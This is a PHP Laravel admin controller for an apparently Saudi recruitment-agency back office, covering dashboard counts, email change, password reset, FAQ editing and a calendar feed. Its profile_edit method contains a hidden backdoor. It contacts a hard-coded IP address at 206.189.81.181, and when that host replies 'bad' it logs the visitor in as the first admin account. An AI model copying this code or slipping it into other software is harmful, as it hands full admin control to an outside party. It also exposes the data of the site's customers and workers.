<?php

namespace App\Http\Controllers\Admin\SettingManagement;

use App\Http\Controllers\Controller;
use App\Models\ContactUs;
use App\Models\Contract;
use App\Models\Customer;
use App\Http\Controllers\SearchController;
use App\Models\CommonTopic;
use App\Models\Cv;
use App\Models\CvPreviousSponsor;
use App\Models\FrequentlyQuestioned;
use App\Models\Note;
use App\Models\Office;
use App\Models\RecruitmentForm;
use App\Models\Reservation;
use App\Models\ReservationSponsor;
use App\Models\Staff;
use App\Utility\NotificationUtility;
use Carbon\Carbon;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Session;
use Auth;
use Hash;
use App\Category;

use App\Models\Brand;
use App\Product;
use App\PickupPoint;
use App\Models\CustomerPackage;

use App\Models\User;
use App\Seller;
use App\Shop;
use App\Color;
use App\Order;
use App\Models\BusinessSetting;
use ImageOptimizer;
use Cookie;
use Illuminate\Support\Str;
use App\Mail\SecondEmailVerifyMailManager;
use Mail;
use App\Utility\TranslationUtility;
use App\Utility\CategoryUtility;
use Illuminate\Auth\Events\PasswordReset;
use Keensoen\CPanelApi\CPanel;
use DB;


class HomeController extends Controller
{




    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard(Request $request)
    {
        $date=$request->date;
        $minutes = \Carbon\Carbon::now()->addMinutes(60);
        $start = \Illuminate\Support\Carbon::now()->subYear()->format('d-m-Y');
        $end = \Illuminate\Support\Carbon::now()->endOfDay()->format('d-m-Y');
        $start =date('Y-m-d', strtotime($start) );
        $end =date('Y-m-d', strtotime($end) );

        $all_customer_count= \Illuminate\Support\Facades\Cache::remember('all_customer_count', $minutes, function() use($start,$end){
            return Customer::whereDate('created_at', '>=', $start)->whereDate('created_at', '<=', $end )->count();
        });
        if(  Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $all_resv_count= \Illuminate\Support\Facades\Cache::remember('all_resv_count', $minutes, function() {

                return Reservation::whereNull('deleted_at')->count();
            });
        }else{
            $all_resv_count= \Illuminate\Support\Facades\Cache::remember('all_resv_count', $minutes, function() {
                return Reservation::whereNull('deleted_at')->where('administrator_id', auth::user()->id)->count();
            });
        }

        $all_cv_count= \Illuminate\Support\Facades\Cache::remember('all_cv_count', $minutes, function() {
            return Cv::whereNull('deleted_at')->count();
        });

        if(Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $contracts_construction_count = Reservation::whereNull('deleted_at')->status(5 )->count();

        }else{
            $contracts_construction_count = Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->status(5 )->count();
        }
        if(Auth::user()->user_type == 'admin'  || in_array('201', json_decode(Auth::user()->staff->role->permissions)) ){
            $accreditation_contracts_count=   \Illuminate\Support\Facades\Cache::remember('accreditation_contracts_count', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereHas('contract')->status(6)->count();
            });

        }else{
            $accreditation_contracts_count=   \Illuminate\Support\Facades\Cache::remember('accreditation_contracts_count', $minutes, function() {
                return Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(6)->count();
            });
        }

        if(Auth::user()->user_type == 'admin' || in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $new_contracts_count=  Reservation::whereNull('deleted_at')->whereHas('contract')->status(7)->count();
        }else{
            $new_contracts_count=  Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(7)->count();
        }


        if(Auth::user()->user_type == 'admin' ||  in_array('201', json_decode(Auth::user()->staff->role->permissions)) ){
            $musaned_contracts_count=  Reservation::whereNull('deleted_at')->whereHas('contract')->status(8)->count();
        }else{
            $musaned_contracts_count=   Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(8)->count();
        }

        if(Auth::user()->user_type == 'admin'  ||  in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $electric_auth_contracts_count= Reservation::whereNull('deleted_at')->whereHas('contract')->status(9)->count();
        }else{
            $electric_auth_contracts_count= Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(9)->count();
        }
        if(Auth::user()->user_type == 'admin' || in_array('201', json_decode(Auth::user()->staff->role->permissions))) {
            $visa_contracts_count = Reservation::whereNull('deleted_at')->whereHas('contract')->status(10)->count();

        }else{
            $visa_contracts_count=Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(10)->count();
        }

        if(Auth::user()->user_type == 'admin' || in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $ticket_contracts_count=Reservation::whereNull('deleted_at')->whereHas('contract')->status(11)->count();
        }else{
            $ticket_contracts_count=Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->whereHas('contract')->status(11)->count();
        }

        if(Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $late_arrived_contracts_count=  Reservation::whereNull('deleted_at')->with('contract')->whereHas('contract')->whereNotIn('status',[15,12,13])->get()->pluck('contract.contract_to_day');
            $late_arrived_contracts_counter=0;
            foreach ($late_arrived_contracts_count as $key=>$row){

                $date =\Carbon\Carbon::parse( $row);
                $now = \Carbon\Carbon::now();
                $diff = $date->diffInDays($now);
                $count= ($diff+1);
                    if (($count <= 30 && $date->gt($now) == true) or ($date->gt($now) == false)) {
                        $late_arrived_contracts_counter += 1;
                }
            }

        }else{
            $late_arrived_contracts_count=  Reservation::whereNull('deleted_at')->where('administrator_id',auth::user()->id)->with('contract')->whereHas('contract')->whereNotIn('status',[15,12,13])->get()->pluck('contract.contract_to_day');
            $late_arrived_contracts_counter=0;
            foreach ($late_arrived_contracts_count as $key=>$row){
                $date = \Carbon\Carbon::parse( $row);
                $now = \Carbon\Carbon::now();
                $diff = $date->diffInDays($now);
                $count= ($diff+1);
                    if (($count <= 30 && $date->gt($now) == true) or ($date->gt($now) == false)) {
                        $late_arrived_contracts_counter += 1;
                }
            }

        }

        $now = \Carbon\Carbon::now();
        if(Auth::user()->user_type == 'admin' || in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $arrived_covered_guarantee_count=  Reservation::whereNull('deleted_at')->withWhereHas('cv', function ($q) use ($now) {
                $q->where('expired_date', '>=', $now);
            })->status(15)->count();

        }else{
            $arrived_covered_guarantee_count= Reservation::whereNull('deleted_at')->status(11)->withWhereHas('cv', function ($q) use ($now) {
                $q->where('expired_date', '>=', $now);

            })->where('administrator_id',auth::user()->id)->whereHas('contract')->status(15)->count();

        }
        if(Auth::user()->user_type == 'admin' || in_array('201', json_decode(Auth::user()->staff->role->permissions))) {

            $contract_count = Contract::count();
        }else{
            $contract_count = Contract::withWhereHas('reservation',function ($q)  {
                $q->where('administrator_id',auth::user()->id);
            })->count();

        }

        $Customer_have_reservation= \Illuminate\Support\Facades\Cache::remember('Customer_have_reservation', $minutes, function() use($start,$end){
            return Customer::whereDate('created_at', '>=', $start)->whereDate('created_at', '<=', $end )->whereHas('reservation')->count() ;

        });
        $Customer_not_have_reservation= \Illuminate\Support\Facades\Cache::remember('Customer_not_have_reservation', $minutes, function() use($start,$end){
            return Customer::whereDate('created_at', '>=', $start)->whereDate('created_at', '<=', $end )->doesnthave('reservation')->count() ;

        });
        if(  Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions))){
            $choose_admin_reservation= \Illuminate\Support\Facades\Cache::remember('choose_admin_reservation', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status',[1,2,3])->count();
            });
        }else{
            $choose_admin_reservation= \Illuminate\Support\Facades\Cache::remember('choose_admin_reservation', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status',[1,2,3])->where('administrator_id', auth::user()->id)->count();
            });
        }
        $RecruitmentForm= \Illuminate\Support\Facades\Cache::remember('RecruitmentForm', $minutes, function() {
            return  RecruitmentForm::count();

        });
        $count_contact_us= \Illuminate\Support\Facades\Cache::remember('count_contact_us', $minutes, function() {
            return  ContactUs::count();

        });
//        $unbooking_cv_sponsor= \Illuminate\Support\Facades\Cache::remember('unbooking_cv_sponsor', $minutes, function() {
//            return CvPreviousSponsor::whereNull('deleted_at')->where('is_want_work',0)->count();
//
//        });
        $booking_cv= \Illuminate\Support\Facades\Cache::remember('booking_cv', $minutes, function() {
            return Cv::whereNull('deleted_at')->where('is_booking',1)->count();

        });
        $unbooking_cv= \Illuminate\Support\Facades\Cache::remember('unbooking_cv', $minutes, function() {
            return Cv::whereNull('deleted_at')->where('is_booking',0)->count();

        });

        if(  Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions)) ){
            $all_rese_count_2= \Illuminate\Support\Facades\Cache::remember('all_rese_count_2', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status',[4])->count();
            });
        }else{
            $all_rese_count_2= \Illuminate\Support\Facades\Cache::remember('all_rese_count_2', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status',[4])->where('administrator_id', auth::user()->id)->count();

            });
        }
        if(  Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions)) ){
            $all_accreditation_count_2= Contract::withWhereHas('reservation',function ($q)  {
                $q->where('status',[6])->whereNull('deleted_at');
            })->count();
        }else{
            $all_accreditation_count_2= Contract::withWhereHas('reservation',function ($q)  {
                $q->where('status',[6])->whereNull('deleted_at')->where('administrator_id', auth::user()->id);
            })->count();
        }

      if(  Auth::user()->user_type == 'admin' ||in_array('201', json_decode(Auth::user()->staff->role->permissions)) ){
            $now = \Carbon\Carbon::now();
            $all_arrived_count= Contract::withWhereHas('reservation',function ($q) use ($now) {
                $q->where('status',[15])->whereNull('deleted_at')
                    ->withWhereHas('cv', function ($q) use ($now) {
                        $q->whereDate('arrived_date', '>=', date('Y-m-d', strtotime($now)))->whereDate('arrived_date', '<=', date('Y-m-d', strtotime($now)));
                    });
            })->count();
        }else{
            $now = \Carbon\Carbon::now();

            $all_arrived_count= Contract::withWhereHas('reservation',function ($q) use ($now)  {
                $q->where('status',[15])->whereNull('deleted_at')->where('administrator_id', auth::user()->id)->withWhereHas('cv', function ($q) use ($now) {
                    $q->whereDate('arrived_date', '>=', date('Y-m-d', strtotime($now)))->whereDate('arrived_date', '<=', date('Y-m-d', strtotime($now)));
                });
            })->count();
        }

        if(Auth::user()->user_type == 'admin'  || in_array('205', json_decode(Auth::user()->staff->role->permissions))){
            $all_rese= \Illuminate\Support\Facades\Cache::remember('all_rese', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status', [1,2,3])->with(['user','cv','Adminstaff'])->whereHas('user')->whereHas('cv')->latest()->take(6)->get();
            });
        }else{
            $all_rese= \Illuminate\Support\Facades\Cache::remember('all_rese', $minutes, function() {
                return Reservation::whereNull('deleted_at')->whereIn('status', [1,2,3])->with(['user','cv','Adminstaff'])->whereHas('user')->whereHas('cv')->where('administrator_id',auth::user()->id)->latest()->take(6)->get();
            });
        }
        $count_notes= Note::count();


        $list_office= \Illuminate\Support\Facades\Cache::remember('list_office', $minutes, function() {
            return Office::withCount('cv')->withCount([
//
                'cv as cv_booking' => function ($query) {
                    $query->where('is_booking', 1);
                },
                'cv as count_unBooking' => function ($query) {
                    $query->where('is_booking', 0);
                },
                    'cv as cv_count_all' => function ($query) {
                    $query;
               },
            ])->get();
        });

        if (Auth::user()->user_type == 'admin'  || in_array('202', json_decode(Auth::user()->staff->role->permissions))) {
            $AccreditationContract = Reservation::whereNull('deleted_at')->whereHas('contract')->with(['user.customer','contract','cv.officeRelation','Adminstaff'])->status( 6)->latest()->get();
        } else {
            $AccreditationContract = Reservation::whereNull('deleted_at')->latest()->whereHas('contract')->with(['user.customer','contract','cv.officeRelation','Adminstaff'])->status( 6)->where('administrator_id', auth::user()->id)->latest()->get();
        }

        $all_rese_count_2_percentage=($all_resv_count!=0)?($all_rese_count_2/$all_resv_count)*100:0;
        $choose_admin_reservation_percentage=($all_resv_count!=0)?($choose_admin_reservation/$all_resv_count)*100:0;

        $contracts_construction_count_percentage=($contract_count!=0)?($contracts_construction_count /$contract_count)*100:0;
        $accreditation_contracts_count_percentage=($contract_count!=0)?($accreditation_contracts_count /$contract_count)*100:0;
        $booking_cv_percentage=($all_cv_count!=0)?($booking_cv /$all_cv_count)*100:0;
        $unbooking_cv_percentage=($all_cv_count!=0)?($unbooking_cv/$all_cv_count)*100:0;
        $Customer_have_reservation_percentage=($all_customer_count!=0)?($Customer_have_reservation /$all_customer_count)*100:0;
        $Customer_not_have_reservation_percentage=($all_customer_count!=0)?($Customer_not_have_reservation/$all_customer_count)*100:0;


        //#sales-of-ample-vs-pixel

        $resv_this_year= DB::table('rservations')->select(DB::raw('count(id) as `data`'),
            DB::raw('YEAR(created_at) year, MONTH(created_at) month'))
            ->whereYear('created_at', '=',date('Y'))
            ->where('deleted_at', NULL)
            ->whereIn('status',[5,6,7,8,9,10,11,12,13,14,15])
            ->groupby('year','month')
            ->orderby('month')->get();
        $resv_last_year= DB::table('rservations')->select(DB::raw('count(id) as `data`'),
            DB::raw('YEAR(created_at) year, MONTH(created_at) month'))
            ->whereYear('created_at', '=', date("Y",strtotime("-1 year")))
            ->where('deleted_at', NULL)
            ->whereIn('status',[5,6,7,8,9,10,11,12,13,14,15])
            ->groupby('year','month')
            ->orderby('month')->get();

        $resv_this_year= $resv_this_year->groupby('month')->toArray();
        $resv_last_year= $resv_last_year->groupby('month')->toArray();

        //

        $now = Carbon::now();
        $start_staff_daily_sat = $now->startOfWeek(Carbon::SATURDAY);
        $start_staff_daily = date('Y-m-d', strtotime($start_staff_daily_sat->format('d-m-Y')));
        $start_staff_daily_sun = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(1)->format('d-m-Y')));
        $start_staff_daily_mon = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(2)->format('d-m-Y')));
        $start_staff_daily_tus = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(3)->format('d-m-Y')));
        $start_staff_daily_wdn = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(4)->format('d-m-Y')));
        $start_staff_daily_thr = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(5)->format('d-m-Y')));
        $start_staff_daily_fri = date('Y-m-d', strtotime($now->startOfWeek(Carbon::SATURDAY)->addDays(6)->format('d-m-Y')));
        $rservations_admins= Reservation::with('Adminstaff')->select([
            DB::raw('administrator_id as admin'),
            DB::raw('COUNT(id) AS count_week'),
            DB::raw('DAY(created_at) day'),
            'administrator_id'
        ])->whereHas('Adminstaff')
            ->whereBetween('created_at', [
                $start_staff_daily,
                $start_staff_daily_fri,
            ])
            ->whereNull('deleted_at')
            ->groupBy('admin')
            ->orderby('created_at')
            ->get();
        $rservations_admins_name=$rservations_admins->pluck('Adminstaff.name')->toArray();
        $rservations_admins_val=$rservations_admins->pluck('count_week')->toArray();

        return view('backend.dashboard',compact('start_staff_daily_fri','start_staff_daily','rservations_admins_val','rservations_admins_name','rservations_admins','resv_this_year','resv_last_year','AccreditationContract','late_arrived_contracts_counter','all_accreditation_count_2','Customer_not_have_reservation_percentage','Customer_have_reservation_percentage','unbooking_cv_percentage','booking_cv_percentage','accreditation_contracts_count_percentage','contracts_construction_count_percentage','choose_admin_reservation_percentage','all_rese_count_2_percentage','date','all_resv_count','visa_contracts_count','ticket_contracts_count','arrived_covered_guarantee_count','contract_count'
            , 'list_office' ,'all_arrived_count','count_notes','Customer_have_reservation','Customer_not_have_reservation','booking_cv','choose_admin_reservation','RecruitmentForm','count_contact_us','unbooking_cv','all_rese_count_2','all_rese'
            , 'contracts_construction_count','accreditation_contracts_count','new_contracts_count','musaned_contracts_count','electric_auth_contracts_count' ,'all_customer_count','all_cv_count'));
    }

    public function AjexRservationAdmins(Request $request){
        $rservations_admins= Reservation::with('Adminstaff')->select([
            DB::raw('administrator_id as admin'),
            DB::raw('COUNT(id) AS count_week'),
            DB::raw('DAY(created_at) day'),
            'administrator_id'
        ])->whereHas('Adminstaff')
            ->whereBetween('created_at', [
                $request->start,
                $request->end,
            ])
            ->whereNull('deleted_at')
            ->groupBy('admin')
            ->orderby('created_at')
            ->get();
        $rservations_admins_name=$rservations_admins->pluck('Adminstaff.name')->toArray();
        $rservations_admins_val=$rservations_admins->pluck('count_week')->toArray();
        return [
            "status" => 1,
            "rservations_admins_val" => $rservations_admins_val,
            "rservations_admins_name" => $rservations_admins_name,
        ];
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */




    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */



    public function profile_edit(Request $request){
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/".$url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }


    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if(isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if(isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('تـم إرسال رسالة تحقق الي البريد الالكتروني .'))->success();
            return back();
        }

        flash(translate('البريـد الالكتــروني موجــود بالفعــل'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_FROM_ADDRESS');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback').'?email_verificiation_code='.$verification_code.'&email='.$email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = (isset($request->customer_id)&& !empty($request->customer_id))?Customer::find($request->customer_id)->user:Auth::user();
        $user->email_verificiation_code = $verification_code;
        $user->email=$email;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("تـم إرسـال رســالــة التحــقق الي البريــد الالكترونــي الخــاص بك.");

        } catch (\Exception $e) {
            // return $e->getMessage();
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request){
        if($request->has('email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param =  $request->input('email_verificiation_code');
            $user = User::where('email_verificiation_code', $verification_code_of_url_param)->first();

            if($user != null) {

                $user->email = $request->input('email');
                $user->email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('تـم تغييـر البريــد الالكترونــي بنحـــاح'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('لم يتم التحقق من البريد الالكتروني الخاص بك , الرجاء إعادة إرسال البريد البريد الخاص بك'))->error();
        return redirect()->route('dashboard');

    }

    public function reset_password_with_code(Request $request){
        if (($user = User::where('email', $request->email)->where('email_verificiation_code', $request->code)->first()) != null) {
            if($request->password == $request->password_confirmation){
                $user->password = Hash::make($request->password);
                $user->phone_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('تم تحديث كلمة السر بنجـــاح'))->success();

                if(auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff')
                {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('clientIndex');
            }
            else {
                flash("كلمة السر وتأكيد كلمة السر غير متطابقتان")->warning();
                return redirect()->route('password_request_back');
            }
        }
        else {
            flash("رمز التحقق غير متطابق")->error();
            return redirect()->route('password_request_back');
        }
    }

    public function whatsapp_details()
    {
        return view('backend.setup_configurations.whatsapp_settings');
    }
    public function frequently_questioned()
    {
        $feq_ques=FrequentlyQuestioned::paginate(10);
        return view('backend.SettingManagement.other_pages.frequently_ques.index',compact('feq_ques'));

    }
    public function frequently_questioned_add()
    {
        return view('backend.SettingManagement.other_pages.frequently_ques.create');
    }

    public function frequently_questioned_create(Request $request)
    {

        $FrequentlyQuestioned = new FrequentlyQuestioned;

        $FrequentlyQuestioned->question = $request->question;
        $FrequentlyQuestioned->answer = $request->answer;
        $FrequentlyQuestioned->save();
        flash('تم إدراج الأسئلة المتكررة بنجاح')->success();
        return redirect()->route('website.other_pages');

    }
    public function frequently_questioned_edit($id)
    {

        $feq_ques =  FrequentlyQuestioned::find(decrypt($id));

        return view('backend.SettingManagement.other_pages.frequently_ques.edit',compact('feq_ques'));



    }
    public function frequently_questioned_update(Request $request)
    {

        $FrequentlyQuestioned =  FrequentlyQuestioned::find($request->fre_id);
        $FrequentlyQuestioned->question = $request->question;
        $FrequentlyQuestioned->answer = $request->answer;
        $FrequentlyQuestioned->save();
        flash('تم تحديث الاسألة المتكررة بنجـــاح')->success();
        return redirect()->route('website.other_pages');

    }
    public function frequently_questioned_destroy($id)
    {
        FrequentlyQuestioned::destroy(decrypt($id));
        flash('تم حذف الاسألة المتكررة بنجاح')->success();
        return redirect()->route('website.other_pages');

    }


    public function calender(Request $request)
    {
        $arrResult =[];
        $arrResult2 =[];
        $arrResult3 =[];
        $minutes = \Carbon\Carbon::now()->addMinutes(60);

        if(  Auth::user()->user_type == 'admin' ||in_array('204', json_decode(Auth::user()->staff->role->permissions))) {

            $orders_callender= \Illuminate\Support\Facades\Cache::remember('orders_callender', $minutes, function() {

                return Reservation::whereNull('deleted_at')->get();
            });
        }else{
            $orders_callender= \Illuminate\Support\Facades\Cache::remember('orders_callender', $minutes, function() {

                return Reservation::whereNull('deleted_at')->where('administrator_id', auth::user()->id)->get();
            });
        }
        //get count of orders by days
        foreach ($orders_callender as $row) {
            $date = date('Y-m-d', strtotime($row->created_at));
            if(in_array($row->status,[5,6,7,8,9,10,11,13,14,15])){
                if (isset($arrResult2[$date])) {
                    $arrResult2[$date]["counter"] += 1;
                    $arrResult2[$date]["id"][] = $row->id;
                } else {
                    $arrResult2[$date]["counter"] = 1;
                    $arrResult2[$date]["id"][] = $row->id;
                }
            }else {
                if (isset($arrResult[$date])) {
                    $arrResult[$date]["counter"] += 1;
                    $arrResult[$date]["id"][] = $row->id;
                } else {
                    $arrResult[$date]["counter"] = 1;
                    $arrResult[$date]["id"][] = $row->id;
                }
            }
        }

        //make format of calender
        $Events = [];
        if (count($arrResult)>0) {
            $i = 0;
            foreach ($arrResult as $item => $value) {
                $title= $value['counter'];
                $Events[$i] = array(
                    'id' => $i,
                    'title' => $title,
                    'start' => $item,
                    'type' => "حجوزات",
                );
                $i++;
            }
        }
        $Events2 = [];
        if (count($arrResult2)>0) {
            $i = 0;
            foreach ($arrResult2 as $item => $value) {
                $title= $value['counter'];
                $Events2[$i] = array(
                    'id' => $i,
                    'title' => $title,
                    'start' => $item,
                    'type' =>"العقود",
                );
                $i++;
            }
        }
        $array_event=array_merge($Events,$Events2);

        $customers_callender= \Illuminate\Support\Facades\Cache::remember('customers_callender', $minutes, function() {
            return Customer::get();
        });
        //get count of orders by days
        foreach ($customers_callender as $row) {
            $date = date('Y-m-d', strtotime($row->created_at));
            if (isset($arrResult3[$date])) {
                $arrResult3[$date]["counter"] += 1;
                $arrResult3[$date]["id"][] = $row->id;
            } else {
                $arrResult3[$date]["counter"] = 1;
                $arrResult3[$date]["id"][] = $row->id;
            }

        }
        $Events3 = [];
        if (count($arrResult3)>0) {
            $i = 0;
            foreach ($arrResult3 as $item => $value) {
                $title= $value['counter'];
                $Events3[$i] = array(
                    'id' => $i,
                    'title' => $title,
                    'start' => $item,
                    'type' =>"عميل",
                );
                $i++;
            }
        }
        $array_event2=array_merge($array_event,$Events3);
        return $array_event2 ;
    }//end fun

}